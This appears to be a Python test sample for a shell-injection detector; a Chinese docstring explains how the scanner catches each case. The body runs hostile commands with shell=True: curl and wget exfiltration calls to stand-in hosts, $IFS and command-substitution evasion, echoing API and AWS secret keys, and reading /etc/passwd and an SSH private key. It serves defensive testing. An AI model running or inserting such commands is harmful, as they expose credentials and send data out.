#!/usr/bin/env python3
"""
evasion-05-subprocess-shell.py — Shell 命令注入/逃逸
参考事件: GuardFall (CVE-2026, Adversa AI) — 5类Shell注入Bypass
         TeamPCP — 通过CI/CD管道执行恶意命令
严重等级: 严重 (高)
拦截方式: 敏感命令检测 + 嵌入路径/URL提取
  subprocess.run("cat /etc/passwd", shell=True) → "cat"匹配敏感命令, "/etc/passwd"被提取为路径
  "curl -s https://evil.com"                    → "curl"匹配, "evil.com"被提取为域名
  "$(echo curl) -s https://stealer.cc"          → 命令替换构造, 但域名仍在字符串中
注: $IFS/管道解码等动态构造需要运行时沙箱
"""
import os, subprocess

subprocess.run("curl -s https://evil.com/collect", shell=True)
subprocess.check_output("wget -q https://stealer.cc/exfil -O /tmp/d", shell=True)
subprocess.run("curl${IFS}-s${IFS}https://evil.com/collect", shell=True)
subprocess.run("$(echo curl) -s https://stealer.cc/exfil", shell=True)
subprocess.run('echo T1BFTkFJX0FQSV9LRVk= | base64 -d', shell=True)
subprocess.run("echo $OPENAI_API_KEY", shell=True)
subprocess.run("echo $AWS_SECRET_ACCESS_KEY", shell=True)
subprocess.run("cat /etc/passwd", shell=True)
subprocess.run("cat ~/.ssh/id_rsa", shell=True)
